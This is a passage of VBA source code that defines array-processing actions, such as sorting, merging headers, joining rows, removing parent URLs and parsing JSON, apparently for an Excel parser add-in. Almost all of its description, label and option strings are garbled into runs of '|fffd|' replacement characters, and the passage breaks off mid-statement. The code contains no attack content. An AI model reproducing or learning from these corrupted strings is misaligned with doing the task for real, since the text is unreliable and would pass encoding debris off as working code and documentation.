    With AAs.AddAction(fc_Array, "ContinueWithArray", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End With
    
    With AAs.AddAction(fc_Array, "AddItemIntoArray", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Value", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Position", aps_Combo, "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd| |fffd||fffd||fffd||fffd||fffd|"), "|fffd| |fffd||fffd||fffd||fffd||fffd|"
    End With
    
    With AAs.AddAction(fc_Array, "SortArray", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", True)
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|), |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)." & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|||fffd||fffd||fffd||fffd|||fffd||fffd||fffd||fffd||fffd||fffd||fffd|), " & _
            "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| 2)"
        .AddParameter "SortOrder", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"), "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "SortType", aps_List, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|"), "|fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Column", aps_Combo, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("1", "2", "3", "4", "5"), "1"
    End With
    
    
    With AAs.AddAction(fc_Array, "ArrayOfNumbers", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|), " & _
            "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| 1, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|=1, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|=10 |fffd| |fffd||fffd||fffd|=4, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| 1,5,9." & vbNewLine & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|. |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|/|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|=1, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|=20 |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|=3, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 20 |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 3," & vbNewLine & _
            "|fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| 1,2,3,4,5,6" & vbNewLine
        .AddParameter "Minimum", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", , "1"
        .AddParameter "Maximum", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Step", aps_Text, "|fffd||fffd||fffd|", , "1"
        .AddParameter "Divider", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End With
    
    With AAs.AddAction(fc_Array, "MergeHeaderWithEveryRow", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
            "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|1||fffd||fffd||fffd||fffd||fffd||fffd||fffd|2||fffd||fffd||fffd||fffd||fffd||fffd||fffd|3 (|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 3 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||36|37|38|39|40|fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||1|1|2|2|1|fffd|, |fffd||5f8||fffd||fffd||fffd||fffd|||fffd||fffd||fffd||1|1|5|2|fffd|" & vbNewLine & _
            "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |)" & vbNewLine & _
            "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 2 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|): |fffd||fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||36-1|37-1|38-2|39-2|40-1|fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd|-|5f8||fffd||fffd||fffd||fffd||36-|fffd||fffd||fffd||37-1|38-1|39-5|40-2|fffd|" & vbNewLine & _
            "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
        .AddParameter "Delimiter", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)", Array("-", "="), "-"
    End With
    
    With AAs.AddAction(fc_Array, "JoinedArray", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|1||fffd||fffd||fffd||fffd||fffd||fffd||fffd|2||fffd||fffd||fffd||fffd||fffd||fffd||fffd|3 (|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 3 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd||fffd| XL|350 |fffd||fffd||fffd||5|fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| M|300 |fffd||fffd||fffd||7|fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| S|300 |fffd||fffd||fffd||8|fffd|" & vbNewLine & _
            "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |)" & vbNewLine & _
            "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 2 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|): |fffd||fffd||fffd||fffd||fffd||fffd||fffd| XL|350 |fffd||fffd||fffd||5|fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| M,|fffd||fffd||fffd||fffd||fffd||fffd| S|300 |fffd||fffd||fffd||15|fffd|" & vbNewLine & _
            "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|,|fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|."
        .AddParameter "ComparedColumn", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("1", "2", "3", "4"), "1"
        .AddParameter "ColumnsToSum", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("", "1", "2,4", "3,2,5"), ""
        .AddParameter "ColumnsToJoin", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("", "1", "2,4", "3,2,5"), ""
        .AddParameter "JoinSeparator", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", Array(",", ";"), ";"
    End With
    
    With AAs.AddAction(fc_Array, "RemoveParentURLs", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|), |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| URL |fffd||fffd||fffd||fffd||fffd||fffd|.  |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| 3 |fffd||fffd||fffd||fffd||fffd||fffd|: http://excelvba.ru/programmes, http://excelvba.ru/programmes/FillDocuments |fffd| http://excelvba.ru/programmes/Parser" & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 2 |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| 3)"
    End With
    
    With AAs.AddAction(fc_Array, "GetJSONArray", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| JSON")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| JSON |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| JSON." & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| [1,[11,12]],[2],[3,[31,[1,5],32]]" & vbNewLine & _
